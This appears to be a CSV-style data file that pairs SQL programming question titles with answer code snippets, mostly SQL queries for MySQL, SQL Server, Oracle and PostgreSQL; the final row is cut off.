23163,32995,simple pivot of columns to rows in MySql,"select 'A' as title1, a as title2 from table union all
select 'B' as title1, b as title2 from table union all
select 'C' as title1, c as title2 from table union all
select 'D' as title1, d as title2 from table
"
31133,24579,Filtering a SQL Join,"FROM tGAAAD AS B
LEFT JOIN tCTD AS A
ON A.check_number = B.check_number
   AND T_ID in (1,2,3)
"
37658,9235,SQL - Not retrieving records from another table when they don't exist,"SELECT    e.*, r.* 
FROM      tblExample e 
LEFT JOIN tblRating r ON e.U_ID = r.U_ID
"
481,53642,How to write SQL query to select percentage with inner join?,"SELECT 
      t1.ItemName,
      t1.Days,
      SUM(Cast(t2.Completed as integer))  DaysCompleted ,
      COUNT(t2.StID) -  SUM(Cast(t2.Completed as integer)) DaysIncompleted  ,
      (COUNT(t2.StID) * 100 / t1.Days))  PercentageCompletion     ,
      t1.Days - SUM(CASE WHEN DateTime > GetDate() THEN 1 ELSE 0)) DaysLeft
FROM 
     table1 t1 
     INNER JOIN table2 t2
     ON t1.ftId = t2.ftID
GROUP BY
      t1.ItemName,
      t1.Days
"
14631,35846,SQL server Update using JOIN,"    UPDATE t2
    SET t2.LastGrantDate = t1.maxppsd
    from table2 t2 inner join
         (select FundingEstablish, max(PlannedProjStartDate) as maxppsd
          from table1
          group by FundingEstablish
         ) t1
         on t2.Serial = t1.FundingEstablish;
"
38324,44301,Count won't count more than one item,"SELECT 
p.productid, 
p.productname,
a.accesoiresid,
c.conditionname,
COUNT(a2.accesoiresid)
FROM product p 
join accesoires a2 on p.productId = a2.productId
join accesoires a on p.productId = a.productId
join cond c on c.conditionid = a.accesoirescondition
  where a.accesoirescondition =
  (select min(accesoirescondition) 
     from accesoires 
    where productId = p.productId)
group by p.productid
"
6620,38281,How do I format numbers in and Access crosstab query to show two decimal places?,"TRANSFORM 

 CDbl(
    FormatNumber(
         Nz(
             Sum([qryPartL].[MILES_OF_PHYS_LENGTH])
         ,0)
     ,2)
 ) AS SumOfMILES_OF_PHYS_LENGTH

SELECT qryPartL.SHORE_TYPE, 

 CDbl(
    FormatNumber(
         Nz(
             Sum(qryPartL.MILES_OF_PHYS_LENGTH)
         ,0)
     ,2)
 ) AS [Total Miles]

FROM qryPartL
GROUP BY qryPartL.SHORE_TYPE
PIVOT qryPartL.CLASS_LOC_text In (""Class 1"",""Class 2"",""Class 4"");
"
37198,17215,"This simple left join operation doesn't work, but why?","SELECT 
    `user`.`id`,
    `user`.`name`,
    `stats`.*
FROM 
`#__users` `user`
LEFT JOIN 
    (SELECT 
        `_s`.`userId`,
        SUM(`_s`.`fild12`) AS `fild12`,
        SUM(`_s`.`fild13`) AS `fild13`
     FROM 
        `#__logbookEventdata` `_s`
     GROUP BY `_s`.`userId`) `stats`
ON 
    (`stats`.`userId`=`user`.`id`)
"
22903,60034,How to add an integral primary key to a table created with SELECT INTO,"ALTER TABLE dbo.CampRegistration
  ADD RegistrationID INT IDENTITY(1,1);

ALTER TABLE dbo.CampRegistration 
  ADD CONSTRAINT PK_CampRegistration
  PRIMARY KEY (RegistrationID);
"
3330,72394,Get rows of table as columns in second table,"select customerID, Pivoted.*
 from Customer
 pivot( Value for sequencenum in (1,2,3,4,5,6, upto 18)) as Pivoted
"
31990,1436,Manage DB before uploading to playstore in android,"class DatabaseHelper extends SqliteOplenHelper{

        private static final int DATABASE_VERSION = 2;   //new version of the database
        private static final int Database_name = ""MyDatabase"";
        private static final String alterUserName = ""alter table users add name text"";
        private static final String table_users = ""create table if not exists ""
            + users + ""("" + ""_id integer primary key autoincrement,""
            + ""email text"" + "")"";

        public DatabaseHelper(Context context) {
        super(context, Database_name, null, DATABASE_VERSION);
        cntxt = context;
    }

        @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

        db.execSQL(table_users);
        db.execSQL(alterUserName);

    }
}
"
37346,9757,Normalize or Denormalize: Store Contact Details (Phone Numbers) in separate Table? Search Performance?,"Contacts:
  ID (Primary Key)
  Name
  Job Title

Phone Number Categories:
  ID (Primary key)
  Name

Phone Numbers:
  ID (Primary Key)
  Category_ID (Foreign Key -> Phone Number Categories.ID)
  Contact_ID (Foreign Key -> Contacts.ID)
  Phone Number
"
28529,22648,How to add hardcoded value to WMI output in Powershell,"$InputFile = Import-Csv ""C:\input\Servers.csv"" | %{ $_.Instance = $_.Instance -replace ""\\.*?$"" ; $_}
Write-Output ""SQL Services details for Server:"" | Out-File C:\output\SQLCHECK.STOPPED.LOG 
Write-Output ""********************************"" | Out-File C:\output\SQLCHECK.STOPPED.LOG  -Append
foreach($Servers in $Inputfile)
{

    Write-Output $Servers|ft -AutoSize | Out-File C:\output\SQLCHECK.STOPPED.LOG 
    $Servicesstate=Get-WmiObject win32_service  -ComputerName $Servers.instance  | Select Name, Startmode, State  |
    Where{$_.name -like ""*SQL*"" -and $_.Startmode -match ""Auto"" -and $_.state -match ""Stopped""}|Select Name,Startmode,State,@{l='Remarks';e={if($_.State -eq ""Stopped""){""Failed""}}}
    if (!$Servicesstate )
    {
        Write-Host ""No Services in STOP state""
        Write-Output ""No Services in STOPPED state"" | Out-File C:\output\SQLCHECK.STOPPED.LOG -Append
    }
    Else
    {
        echo ($Servicesstate|ft -AutoSize )
        Write-Output ($Servicesstate)  |FT -auto| Out-File C:\output\SQLCHECK.STOPPED.LOG  -Append
    }
}
"
23351,45994,Merging result from 2 columns with same name and not over-writing one,"SELECT *,CC.configuration as cc_conf, CI.configuration as ci_conf FROM `content_category` CC , `content_item` CI WHERE
CI.content_id = '"" . (int)$contentId . ""'
AND CI.category_id = CC.category_id
AND CI.active  = 1
"
2678,47054,Optimize Subselect Search query,"SELECT
    r.id
    ,r.title
    ,r.subtitle
    ,ra.authors
    ,rk.keyworks
FROM
    reference r
    LEFT JOIN
        (SELECT
            r.id
            ,GROUP_CONCAT(CONCAT(a.firstname, ' ', a.lastname) ORDER BY CONCAT(a.firstname, ' ', a.lastname) SEPARATOR ', ') as authors
        FROM
            reference r
            LEFT JOIN reference_author_mm r2a
                ON r.id = r2a.uid_local
            LEFT JOIN author a 
                ON a.id = r2a.uid_foreign
        GROUP BY
            r.id) ra
        ON ra.id = r.id
    LEFT JOIN
        (SELECT
            r.id
            ,GROUP_CONCAT(k.keyword ORDER BY k.keyword SEPARATOR ', ') as keyworks
        FROM
            reference r
            LEFT JOIN reference_keyword_mm r2k
                ON r.id = r2k.uid_local
            LEFT JOIN keyword k
                ON k.id = r2k.uid_foreign
        GROUP BY
            r.id) rk
        ON rk.id = r.id 
ORDER BY
    r.id
"
10485,36193,"How do I do a comparison with just a month and year, not a complete date?","SELECT
  *
FROM
  MyTable
WHERE  
  -- yields ""200901 between 200801 and 201104"" on inputs 01-01-2008, 04-01-2011
  Convert(VarChar(10), MyTable.Year) + Replace(Str(MyTable.Month, 2), ' ', '0')
   BETWEEN
  Convert(VarChar(10), YEAR(@StartDate)) + Replace(Str(MONTH(@StartDate), 2), ' ', '0')
   AND
  Convert(VarChar(10), YEAR(@EndDate)) + Replace(Str(MONTH(@EndDate), 2), ' ', '0')
"
4329,16460,Getting column_name different in two tables,"select * from (select T.id1,T.id2,
T.amt1,      P.amt1,
T.amt2,      P.amt2,
T.id3,       P.id3
decode(nvl(T.amt1 ,0)-nvl(P.amt1 ,0),0,'','amt1')||' '||decode(nvl(T.amt2 ,0)-nvl(P.amt2 ,0),0,'','amt2')||' '||decode(nvl(T.id3 ,0),nvl(P.id3 ,0),'','ID3') difference_in_col
from 
Table1 T,
Table2 P
where 
T.id1=P.id1
and T.id2=P.id2
) where difference_in_col is not null;
"
21577,1545,Adding different values in a single cell,"WITH X AS 
(
    SELECT 'AAA' AS A, 'BBB' AS B, 123 AS C
    UNION
    SELECT 'AAA' AS A, 'BBB' AS B, 456 AS C
    UNION
    SELECT 'AAA' AS A, 'BBB' AS B, 789 AS C
)
SELECT DISTINCT
    X.A,
    X.B,
    STUFF((SELECT '-' + CAST(C AS VARCHAR(3)) FROM X FOR XML PATH ('')), 1, 1, '')
FROM
    X
"
37511,51075,Group days by week sql server / ssrs,"SELECT DATEPART(WEEK, specified_date)
"
35841,37717,Return string based on values within the string without truncating,"SELECT  *
FROM    Car
WHERE   RIGHT(CarProfile, 4) =
        (SELECT MAX(RIGHT(CarProfile, 4)) 
        FROM Car)
"
1874,39439,SQL Join Not Returning What I Expect,"SELECT COUNT(e.EventID), T.Customer, T.Year, T.Month
FROM [Event] e
INNER JOIN #T T ON (
  T.CustomerID = e.CustomerID and 
  T.Year = year(e.DateOpened) and 
  T.Month = month(e.DateOpened) 
  ) 
WHERE T.Year = 2008 
  and T.Month = 12 
GROUP BY T.Customer, T.Year, T.Month
ORDER BY T.Year, T.Month
"
13769,5990,SQL count using subquery,"SELECT USER, COUNT(*)
FROM ORDERS
WHERE ENTRY_DATE BETWEEN SYSDATE - 5 AND SYSDATE
GROUP BY USER
"
21873,45965,PLSQL- How to exit FORALL Loop,"FOR i IN 1 .. my_array.COUNT
   LOOP
       INSERT
       INTO my_table
        ......
   END LOOP;
   commit;      

     apps.fnd_request.submit_request (application   => 'PO',
                                      program       => 'REQIMPORT',
                                      argument1     => l_p4,
                                      argument2     => l_p5,
                                      argument3     => l_p6,
                                      argument4     => '',
                                      argument5     => 'N',
                                      argument6     => 'N');
"
32639,34358,MySQL complex join of three tables,"SELECT hc.id, u.id, u.name, c.id, c.title
FROM courses as c -- must exist
LEFT JOIN users as u on 1=1 -- all users, optional
LEFT JOIN hidden_courses as hc on hc.user_id=u.id and hc.course_id=c.id -- optional
"
10581,52740,Postgresql complicated case statement,"select cust_id, indicator, date,
       max(case when indicator = 'y' then date end) over (partition by cust_id
                                                          order by date) as NewCol
from table t;
"
21811,17415,How to convert SQL result set to JSON in Groovy?,"println new JsonBuilder(clients:resultset).toPrettyString()
"
38910,72044,Query for Parent Child Relationship to the top level,"DECLARE @t TABLE (NodeId int, NodeName varchar(100), ParentId int, Permission int)
INSERT @t VALUES 
(1,'Node1',0,NULL),
(2,'Node2',1,1),
(3,'Node3',1,NULL),
(4,'Node4',1,NULL),
(5,'Node5',2,NULL),
(6,'Node6',5,NULL),
(7,'Node7',2,NULL),
(8,'Node1',0,NULL),
(9,'Node9',8,2),
(10,'Node10',9,NULL),
(11,'Node11',10,NULL),
(12,'Node12',11,NULL),
(13,'Node13',10,NULL),
(14,'Node14',9,NULL);

WITH CTE AS
(
    SELECT NodeId, NodeName, ParentId AS RootID FROM @t WHERE Permission IS NOT NULL
    UNION ALL
    SELECT T.NodeId, T.NodeName, CTE.RootID
    FROM @t T JOIN CTE ON T.ParentId = CTE.NodeId
)
SELECT
    *
FROM
    CTE
WHERE
    NodeName IN ('Node6', 'Node13');
"
6547,51110,Writing data from email to SQL server 2008R2,"<a href=""http://internal-site.mycompany.com?id=123&action=yes"" target=""_blank"">Approve Change</a> 

<a href=""http://internal-site.mycompany.com?id=123&action=no"" target=""_blank"">Reject Change</a> 
"
23851,42965,PIVOT'ing in SQL server,"Select * from (Select JobNum,ProjName,jc,ts_JobCodeID,mainUsrFk,ts_JobID,
[05/09/2011]     as col1,[05/11/2011] as col2,[05/12/2011] as col3,
[05/13/2011] as col4,[05/14/2011] as col5,[05/15/2011] as col6,[05/10/2011] as col7      from (
SELECT 
            tbl_track_empHours.track_empHours_hours 
            ,tbl_track_empHours.track_empHours_date
            , tbl_track_jobInfo.track_jobInfo_jobNum AS JobNum
            , tbl_track_jobInfo.track_jobInfo_ProjName AS ProjName
            , tbl_track_jobCodes.track_jobCode_jc AS jc
            , tbl_track_jobCodes.track_jobCode_id_pk AS ts_JobCodeID
            , tbl_track_empHours.track_empHours_main_usr_id_fk as mainUsrFk
            , tbl_track_jobInfo.track_jobInfo_id_pk AS ts_JobID
        FROM   tbl_track_empHours INNER JOIN
               tbl_track_jobInfo ON tbl_track_empHours.track_empHours_jobinfo_id_fk = tbl_track_jobInfo.track_jobInfo_id_pk INNER JOIN
               tbl_track_jobCodes ON tbl_track_empHours.track_empHours_jobCode_id_fk = tbl_track_jobCodes.track_jobCode_id_pk
        WHERE  (tbl_track_empHours.track_empHours_main_usr_id_fk = '268') 
        AND (tbl_track_empHours.track_empHours_date BETWEEN '5/09/2011'  AND  '5/15/2011')  
        ) o

PIVOT(      SUM(o.track_empHours_hours)
FOR o.track_empHours_date in ([05/09/2011],[05/10/2011],[05/11/2011],[05/12/2011], 
[05/13/2011],[05/14/2011],[05/15/2011]))p ) as a
"
22448,61482,SQLAlchemy query a chain of One-to-Many relationships,"qry = Page.query.join(Chapter).join(Book).filter(Book.id == 1)
"
2240,41842,Find similar entries in SQL column and rank by frequency,"with recursive cte(uri) as 
(
  select uri from uris
  union all
  select substr(uri, instr(uri, '.') + 1) as uri from cte where instr(uri, '.') > 0
)
select uri, count(*)
from cte
where length(uri) = length(replace(uri,'.','')) + 1 -- domains only
group by uri
order by count(*) desc;
"
2402,57653,sql left outer join order by column in left table but preserve all rows,"SELECT 
  t1.id
FROM table1 AS t1
LEFT OUTER JOIN
(
   SELECT table1_id, SUM(column1) sum1, SUM(column2) sum2
   FROM table2 
   GROUP BY table1_id
) AS t2  ON t2.table1_id = t.id
        AND t1.entry_id  = 2 
        AND t1.parent_id = 0 
ORDER BY t2.sum1 - t2.sum2;
"
12380,55215,SQL trying to generate random int 64 bit and,"CONVERT(int, FLOOR(RAND()*( POW(2,64) -1))
"
27445,17410,Get max values in PostgreSQL 8.0,"SELECT DISTINCT v.vendor_name AS vendor,
       vpc.category_name AS V_Type,
       vp.vendor_pkg_name AS Package_name,
       vl.eval_date AS C_Date,
       vls.load_status_name AS Status
FROM ces_idw.vendor v,
     ces_idw.vendor_pkg_category vpc,
     ces_idw.vendor_load vl,
     ces_idw.vendor_pkg vp,
     ces_idw.vendor_load_status vls
WHERE  (vl.eval_date) IN (
                         SELECT DISTINCT MAX(vl.eval_date)
                         FROM  ces_idw.vendor_load vl
                         WHERE v.vendor_id = vp.vendor_id
                         AND   v.vendor_name = 'L&T'
                         AND   vp.vendor_pkg_id = vl.vendor_pkg_id
                         AND  (TO_CHAR(vl.eval_date,'yyyy-mm') between '2013-01' and '2015-12')
                         GROUP BY extract(month from vl.eval_date),vl.vendor_pkg_id, v.vendor_name
                         ) 
AND   vp.vendor_pkg_category_id = vpc.vendor_pkg_category_id
AND   vp.vendor_pkg_id = vl.vendor_pkg_id
AND   vl.load_status_id = vls.load_status_id
ORDER BY vp.vendor_pkg_name
"
8587,61603,How can I use an alias inside a sub-query?,"WITH Full_Table AS (---Long Sub Query---)
SELECT A,B,C 
FROM Full_Table
WHERE RATIO=(SELECT MAX(RATIO) FROM Full_Table);
"
29318,16529,Need help understanding SUM,"select S.supplier_id, -- values are the same, but is this necessary in your result set; if this value changes, you would have the separation in your data
   s.supplier_name, -- cannot see in your picture, but these are likely all the same
   ph.po_no, -- values are different, is this necessary in your result set?
   ph.order_date, -- values are different, again, is this necessary in your result set?
   ph.location_id, -- values are the same, but is this necessary in your result set; if this value changes, you would have the separation in your data
   im.item_id, -- the primary grouping factor
   im.item_desc, -- the description of the primary grouping factor (should not change per record)
   invs.supplier_part_no, -- values are the same, but is this necessary in your result set; if this value changes, you would have the separation in your data
   sum( pl.qty_received) as received, -- the aggregate you are performing
   pl.unit_price -- we cannot see this in your picture, but this could also be a changing value that could cause separation in your data, is it necessary in your result set?
from po_line pl
inner join po_hdr ph on ph.po_no = pl.po_no
inner join supplier s on s.supplier_id = ph.supplier_id
inner join inv_mast im on im.inv_mast_uid = pl.inv_mast_uid
left join inventory_supplier invs on invs.supplier_id = s.supplier_id 
and invs.inv_mast_uid = im.inv_mast_uid
where ph.order_date between '2014-01-01' and '2014-12-31'
and ph.supplier_id = '101315'
and ph.delete_flag != 'Y'
and ph.complete = 'y'
and pl.delete_flag != 'y'
and pl.cancel_flag != 'y'
and ph.cancel_flag != 'y'
Group by -- the Group by clause should change with a change in the columns selected
pl.qty_received, -- the aggregate should also, likely, not be part of the group by clause
im.item_id,
S.supplier_id,
s.supplier_name,
ph.po_no,
ph.location_id,
im.item_desc,
invs.supplier_part_no,
pl.unit_price,
ph.order_date
order by item_id

-- an example of how this might look

select S.supplier_id,
   MAX(s.supplier_name),
   im.item_id,
   MAX(im.item_desc),
   sum( pl.qty_received) as received,
from po_line pl
inner join po_hdr ph on ph.po_no = pl.po_no
inner join supplier s on s.supplier_id = ph.supplier_id
inner join inv_mast im on im.inv_mast_uid = pl.inv_mast_uid
left join inventory_supplier invs on invs.supplier_id = s.supplier_id 
and invs.inv_mast_uid = im.inv_mast_uid
where ph.order_date between '2014-01-01' and '2014-12-31'
and ph.supplier_id = '101315'
and ph.delete_flag != 'Y'
and ph.complete = 'y'
and pl.delete_flag != 'y'
and pl.cancel_flag != 'y'
and ph.cancel_flag != 'y'
Group by
S.supplier_id,
im.item_id
order by item_id
"
11107,48073,How to get a list of user defined data types on Sybase ASE?,"select s1.name, 
        (select name 
         from systypes s2 
         where s2.usertype=(
                            select min( s3.usertype) 
                            from systypes s3 
                            where  s3.hierarchy=s1.hierarchy)
        ) base_type,  USER_NAME(s1.uid) as owner
    from systypes s1
    WHERE s1.usertype>100  
"
17997,12967,Getting Parent of Parent in Self Join Table,";with locs as
(
select 1 as level, ShortName, ParentId
from Locations 
WHERE LocationId = 100
UNION ALL
SELECT level + 1, l.ShortName, l.ParentId
FROM Locations l 
JOIN locs ON locs.ParentId = l.LocationId
)
SELECT * FROM locs;
"
6972,4580,Does number of wildcard characters(specially %) matter in SQL Like Statement?," % Any string of zero or more characters.

 _ (underscore) Any single character. 
"
3996,64381,SQL: How can i build a string from column values of one row?,"SELECT ('' + 
    CASE WHEN Red = 1 THEN 'Red, ' ELSE '' END
    CASE WHEN Blue = 1 THEN 'Blue, ' ELSE '' END
    CASE WHEN Green = 1 THEN 'Green, ' ELSE '' END
)
AS Note
FROM MyTable
"
18608,3532,SQL query to find whether all sub-parts exist,"SELECT
    StudentId,
    CourseId,
    MAX(TakenOn) as TakenOn,
    case when Count(CourseId) = 
            (select COUNT(distinct TakenOn) 
            FROM SessionAttendance SessionAttendanceCount
            where SessionAttendanceCount.CourseId = SessionAttendance.CourseId
            ) then
        1
    else
        0
    end AttendedAllSessions
FROM SessionAttendance
GROUP BY StudentId, CourseId
"
38776,65686,select the extra row data,"select b.* from
  (select * from ForgeRock where seq = 'A13') a
right join 
  (select * from ForgeRock where seq != 'A13') b
on a.id = b.to_id
where b.to_id = '_';
"
38374,50884,How to execute one of the two queries based on a Condition in Oracle 10g?,"SELECT IIM.index_num, IIM.description
FROM inv_item_mst IIM
WHERE (:groupCd IS NOT NULL AND IIM.group_cd =:groupCd)
OR (:groupCd IS NULL AND
    IIM.group_cd IN (:GroupCode1,:GroupCode2,:GroupCode3,:GroupCode4,:GroupCode5,:GroupCode6,:GroupCode7)
    AND IIM.generic_cd LIKE NVL(:generic_cd_param,'%')
    AND IIM.supplier_cd LIKE NVL(:supplier_cd_param,'%')
   )
"
17274,27776,Creating new column for rolling average in SQL,";WITH CTE AS
(
    SELECT A.issueid, A.[date], A.rate, AVG(B.rate) mse_m
    FROM dbo.my_table A
    OUTER APPLY (SELECT *
                 FROM dbo.my_table
                 WHERE issueid = A.issueid
                 AND [date] BETWEEN DATEADD(MONTH,-2,A.[date]) AND A.[date]) B 
    GROUP BY A.issueid, A.[date], A.rate
)
UPDATE A
SET A.mse_m = B.mse_m
FROM dbo.my_table A
INNER JOIN CTE B
    ON A.issueid = B.issueid
    AND A.[date] = B.[date]
    AND A.rate = B.rate;
"
26528,58019,Oracle - storing user settings,"**User**
UserId
UserData

**Team**
TeamId
TeamData


**UserTeam**
UserId
TeamId

foreign key constraints to user and team table

**UseScore** 
UserId
TeamId
ActivityId
Score

foreign key constraints to user, team and activity table
"
24084,35616,How do I refactor this SQL query?,"select ""Malaysia"",
    SUM(CASE WHEN activated_at is not null THEN 1 ELSE 0 END) as ""Activated"",
    SUM(CASE WHEN activated_at is null THEN 1 ELSE 0 END as ""Not Activated"",
    count(*) as ""Total""
from users 
where locale=""en"" and  date_format(created_at,'%m')=date_format(now(),'%m');
"
14436,66094,how to reach D5 in tuplesort.c 's polyphase merge algorithm?,"set work_mem = 64;
"
19835,15318,updating a table conditionally with values from a group by sub query in oracle,"UPDATE employee e
   SET sal = sal * (SELECT CASE
                              WHEN COUNT(*) >= 5 THEN
                               1.5
                              WHEN COUNT(*) >= 3 THEN
                               1.3
                              WHEN COUNT(*) >= 1 THEN
                               1.2
                              ELSE
                               1
                           END
                      FROM employee_project_history eph
                     WHERE eph.empno = e.empno);
"
14480,74224,mysql update is so slow - is there any faster way to update data?,"UPDATE processed 
inner join DumpTable on processed.id = DumpTable.id
SET number1=DumpTable.value1 , number2=DumpTable.value2, timestamp=unix_timestamp()
"
28326,47866,Get latest date before date value in row,"SELECT  p.ID, 
        p.Patient,
        p.ProcedureType,
        p.ProcedureDate,
        [LastExamDate] = exam.ProcedureDate, 
        [DaysSinceLastExam] = DATEDIFF(DAY, exam.ProcedureDate, p.ProcedureDate),
        [LastExamType] = exam.ProcedureType 
FROM    Procedures p
        OUTER APPLY
        (   SELECT  TOP 1 exams.ProcedureType, exams.ProcedureDate
            FROM    Procedures exams
            WHERE   Exams.ProcedureType LIKE '%Exam%'
            AND     Exams.Patient = p.Patient
            AND     Exams.ProcedureDate <= p.ProcedureDate
            ORDER BY Exams.ProcedureDate DESC
        ) exam;
"
21149,71364,Possible to eliminate this sub query?,"SELECT DocumentID,
       CASE WHEN ROW_NUMBER() OVER ( PARTITION BY JurisdictionID, DocumentStatusID
                                     ORDER BY LastStatusChangedDateTime )
         = 1 THEN 1 ELSE 0 END AS Bit 
FROM Documents
"
7466,15603,SQL statement returns wrong values (TOP n ... ORDER BY),"select top n ...
from (
  select ...
  from table
  where ...
  order by ...
)
"
5231,75430,Joining tables in MySQL with multiple foreign keys,"SELECT r.id, r.start, r.end, pA.desc as pointA, pB.desc as pointB
FROM rides r
JOIN points pA ON pA.id = r.pointA
JOIN points pB ON pB.id = r.pointB
WHERE r.id = 1;
"
20790,44863,SQL multiple active jobs query,"SELECT ce.emp_no
FROM cont_employee ce JOIN
     contractor c
     ON c.emp_no = ce.emp_no
WHERE c.is_active = 1
GROUP BY ce.emp_no
HAVING COUNT(*) > 1;
"
29350,51796,concatenate strings in sqlite sum strings,"UPDATE fazerbem_carrinho_historico 
SET pendencia_pago = '10.00', 
    pendenciahistorico = pendenciahistorico || '12' 
WHERE data_compra = '76'
"
3004,63212,Query tables ordered by having most number of records,"SELECT o.name, t.rowcnt
  FROM sysobjects o, systabstats t
WHERE o.id = t.id
  AND t.rowcnt > 0            --ignore 0 row entries
  AND o.name not like ""sys%""  --exclude system tables
ORDER BY t.rowcnt DESC
"
15945,18261,Update field with Word Count from SELECT statement,"update articles a
     set wordcount = (LEN(article) - LEN(REPLACE(article, ' ', ''))) + 1;
"
15802,46105,Migrating a database table with timestamp columns,"select  cast([timestamp] as varbinary(8))
"
17338,3811,Inner-Join MS Access to Excel,"Option Explicit
Public Sub Connect(strVar As String)
    Dim strEmps As String, strPath As String
    dim connEmp as New ADODB.Connection
    dim rstEmps as New ADODB.Recordset
    strEmps = ""SELECT s.fldStudentNo, s.fldFirstName, s.fldLastName, s.fldTelephone, d.fldDepartmentName, c.fldClassDate, c.fldClassName""
    strEmps = strEmps & "" FROM tblDepartments d""
    strEmps = strEmps & "" INNER JOIN tblStudents s ON s.[fldDeptNo] = d.[fldDepartmentNo]""
    strEmps = strEmps & "" INNER JOIN tblStudentsAndClasses sc ON sc.[fldStudentNo] = s.[fldStudentNo]""
    strEmps = strEmps & "" INNER JOIN tblClasses c  ON c.[fldClassNo] = sc.[fldClassNo]""
    strEmps = strEmps & "" WHERE d.fldDepartmentName = '×××' ORDER BY s.fldLastName;""
    strEmps = replace(strEmps, ""×××"", strVar)
    strPath = ThisWorkbook.Path & chr(92) & cstrPath  '.Path doesn't usually end in a backslash
    debug.print strPath
    connEmp.Open ""Provider=Microsoft.ACE.OLEDB.12.0;Data Source='"" & strPath & ""';""
    set rstEmps = connEmp.Execute(strEmps)
    Call DisplayData
    rstEmps.close: set rstEmps = nothing
    connEmp.close: set connEmp = nothing
End Sub
"
9669,861,MYSQL - select TABLE A rows that are not in Table B except the rows are in TABLE C,"SELECT *
FROM A 
WHERE (NOT EXISTS (SELECT * FROM B WHERE B.dvdID=A.dvdID))
   OR (EXISTS (SELECT * FROM C,B WHERE C.rentID=B.rentID and B.dvdID=A.dvdID))
"
24810,9563,How to get desired result from this query?,"  Select * from documents d left join SR s on d.relationid = s.SRId left join Events e on d.relationid = e.EventId
"
34284,31659,How to add SQL query parameters into service report,"=""Start Date: "" &  Format(Parameters!startDate.Value, ""dd/MM/yyyy"")  & "" and End Date: "" 
  &  Format(Parameters!EndDate.Value, ""dd/MM/yyyy"")  
"
17189,40699,Simple HQL/sql query..need assistance?,"SELECT * 
FROM person 
LEFT JOIN (SELECT * 
           FROM vacations 
           WHERE startDate BETWEEN '2011-07-01' AND '2011-07-30')
"
26839,63900,Complex Select in PostgreSQL,"
select string_agg(col,', ') result 
from (
       select row_number() over() ||'_'|| foo  col 
       from bar
     ) t
"
6239,29715,Select daily amount of specific values from same column,"SELECT
  DATE(timestamp),
  IFNULL(sum(case when satisfaction = 0 then 1 end), 0) as 'unhappy',
  IFNULL(sum(case when satisfaction = 5 then 1 end), 0) as 'neutral',
  IFNULL(sum(case when satisfaction = 10 then 1 end), 0) as 'happy' 
FROM feedback
GROUP BY DATE(timestamp)
"
24348,45792,INSERT INTO for each SELECT returns,"insert into some_table (col1, col2, col3)
SELECT field1, field2, 'additional data'
FROM table1 
WHERE field1 IS NOT NULL AND field2 IS NOT NULL
"
32208,25125,Create SQL Query for Name/Value Pair Data,"SELECT t.id,t.source
       max(CASE WHEN t.fieldname = 'From' then t.FieldValue end) as From_col,
       max(CASE WHEN t.fieldname = 'To' then t.FieldValue end) as To_col,
       max(CASE WHEN t.fieldname = 'Subject' then t.FieldValue end) as Subject_col
FROM YourTable t
GROUP BY t.id,t.source
"
13356,21340,MySQL: have internal query reference external column on same table,"select id,
(select count(*) from T 
    where DATE(startTime)=DATE(T1.startTime)
          AND 
          StartTime<T1.StartTime  
) as 
CountNumIDsBeforeThisIDOnSameDay,

(select count(*) from T 
    where DATE(startTime)=DATE(T1.startTime)
          AND 
          EndTime<T1.StartTime  
) as 
CountNumIDsThatEndedBeforeThisIDOnSameDay


from T as T1
Order by StartTime
"
21886,53955,Insert into command with Columns,"SELECT COL.COLUMN_NAME
FROM
    information_schema.columns COL
WHERE 
    (COL.TABLE_SCHEMA = 'schema_name') AND
    (CO.TABLE_NAME = 'table_name')
"
15203,65920,How to convert IST time stored as string into Sql Server DateTime Data type,"declare @dt varchar(50)='Sat Sep 01 2012 09:00:00 GMT+0530'
select CONVERT(datetime,substring(@dt,5,20))
"
8524,62565,"SQL: Select all rows that meet a condition if that condition is met, but only a certain nuber rows if it isn't",";WITH ranked AS (
  SELECT
    *,
    rownum = ROW_NUMBER() OVER (PARTITION BY ClientID ORDER BY BillingDate DESC)
  FROM Billings
)
SELECT ClaimID, ClientID, BillingDate
FROM ranked
WHERE BillingDate > @CutOffDate OR rownum BETWEEN 1 AND 3
"
12942,42242,SubQuery on Single Table,"SELECT TaskId as ParentTaskId, ChildOf , 
 (SELECT count(t2.TaskId) 
  FROM Tasks t2
  WHERE t2.ChildOf = t.TaskId) as CountChildren
FROM Tasks t 
WHERE t.ChildOf = 0
"
22251,49942,SYS_CONNECT_BY_PATH and START WITH/CONNECT BY PostgreSQL Equivalent,"with recursive tree as (
  select wtn, 
         resp_tcsi as tcsi_codes
   from data
   where rn = 1 -- this is the ""start with"" part

   union all

   select ch.wtn, 
          p.tcsi_codes||','||ch.resp_tcsi 
   from data as ch
    join tree p 
      on ch.rn -1 = p.rn -- this is the ""connect by"" part
     and ch.wtn = p.wtn
)
select *
from tree;
"
23842,11557,Find how many times it took to achieve a particular outcome in SQL Table,"select cid,
       min(case when Outcome = 'Sale' then seqnum end) - 1 as AttemptsBeforeSale
from (select t.*,
             row_number() over (partition by cid order by date) as seqnum
      from t
     ) t
group by cid;
"
18097,52211,"Data size of result with join, how to optimize?","SELECT COUNT(*)
FROM tbl1
"
31993,20103,How would I solve this SQL exercise?,"SELECT AVG(salary) - AVG(REPLACE(salary, '0', '')) AS mistake
FROM   employees
"
10752,22838,Execute Stored Procedure in a Cursor,"create table #t
(
name sysname,
rows bigint,
reserved varchar(50),
data varchar(50),
index_size varchar(50),
unused varchar(50)
)

EXEC  sp_MSForEachtable 'insert into #t EXEC sp_spaceused ''?'''

select name,rows,reserved,data,index_size,unused 
from #t
"
16294,61395,NULL to zero with ISNULL,"SELECT
  name,
  SUM(IFNULL(growth, 0))                         AS sum_buy_price,
  SUM(IFNULL(recovery, 0))                       AS sum_msrp,
  SUM(IFNULL(growth, 0))+SUM(IFNULL(recovery,0)) AS total
FROM
  orders
WHERE
  id = '$id'
GROUP BY
  name
"
2564,54294,SQL ORACLE MERGE Table,"MERGE INTO MA_PARTICIPANT P
USING TABLE_TO_CHANGE TT 
ON (TT.PART_ID = P.PART_ID)
WHEN matched THEN
  UPDATE    
  SET CUSTOMER_RK = NEW_CUSTOMER_RK,
      DEACT_FLG =   'Y'
"
24156,27197,SQL Like operator with wildcard finding two similar strings - I just want one of them,"'Controller/action/' + @ID + '\D' 
"
36427,23074,SQL query with two columns as foreign keys of the same table,"SELECT a.id, a.name, b1.code, b2.code
FROM tableA a
JOIN tableB b1 ON b1.id = a.fk_1_table_B_1
JOIN tableB b2 ON b2.id = a.fk_2_table_B_2
"
3062,19170,SQL: How can I make this query more flexible,"SELECT 
  p.*,  -- persons 
